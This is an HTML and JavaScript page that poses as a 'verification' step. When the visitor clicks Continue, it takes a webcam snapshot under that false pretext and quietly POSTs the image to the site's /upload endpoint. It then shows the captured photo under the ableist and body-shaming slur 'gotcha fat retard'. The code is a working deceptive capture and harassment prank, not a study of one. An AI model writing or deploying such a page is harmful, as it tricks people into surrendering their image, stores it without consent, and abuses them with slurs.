<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>One moment</title>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      max-width: 420px;
      margin: 0 auto;
      padding: 24px;
      text-align: center;
      background: #f5f5f5;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    h1 { font-size: 1.35rem; color: #333; margin-bottom: 8px; font-weight: 600; }
    .sub { color: #666; font-size: 0.95rem; margin-bottom: 28px; line-height: 1.5; }
    button {
      padding: 14px 32px;
      font-size: 1rem;
      cursor: pointer;
      border: none;
      border-radius: 8px;
      font-weight: 600;
      background: #333;
      color: #fff;
    }
    button:hover { background: #555; }
    button:disabled { opacity: 0.6; cursor: wait; }
    #message { margin-top: 20px; font-size: 0.9rem; color: #666; min-height: 1.5em; }
    .hidden { display: none !important; }
    .reveal img {
      width: 100%;
      max-width: 280px;
      border-radius: 12px;
      margin-top: 16px;
      border: 2px solid #333;
    }
    .reveal h1 { font-size: 1.5rem; margin-top: 8px; }
    .reveal .sub { margin-bottom: 0; }
  </style>
</head>
<body>
  <div id="intro">
    <h1>One moment</h1>
    <p class="sub">We need to verify something before you continue.</p>
    <button id="goBtn">Continue</button>
    <p id="message"></p>
  </div>

  <div id="reveal" class="hidden reveal">
    <h1>gotcha fat retard</h1>
    <img id="photo" alt="" />
    <p id="revealNote" class="sub hidden" style="margin-top: 12px;"></p>
  </div>

  <video id="video" autoplay playsinline muted class="hidden"></video>

  <script>
    const intro = document.getElementById('intro');
    const reveal = document.getElementById('reveal');
    const revealNote = document.getElementById('revealNote');
    const goBtn = document.getElementById('goBtn');
    const video = document.getElementById('video');
    const photo = document.getElementById('photo');
    const message = document.getElementById('message');

    const canvas = document.createElement('canvas');
    canvas.width = 640;
    canvas.height = 480;

    goBtn.addEventListener('click', async () => {
      goBtn.disabled = true;
      message.textContent = 'Checking…';

      let dataUrl = null;

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        video.srcObject = stream;

        await new Promise((resolve) => {
          video.onloadeddata = () => setTimeout(resolve, 1500);
        });

        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        dataUrl = canvas.toDataURL('image/png');

        stream.getTracks().forEach(t => t.stop());
        video.srcObject = null;

        message.textContent = 'Almost there…';

        const res = await fetch('/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ image: dataUrl })
        });

        if (!res.ok) throw new Error('Upload failed');
      } catch (e) {
        console.error(e);
        if (!dataUrl) {
          message.textContent = "We couldn't complete that. Try again?";
          goBtn.disabled = false;
          return;
        }
        revealNote.textContent = "(Couldn't save to server)";
        revealNote.classList.remove('hidden');
      }

      photo.src = dataUrl;
      intro.classList.add('hidden');
      reveal.classList.remove('hidden');
    });
  </script>
</body>
</html>
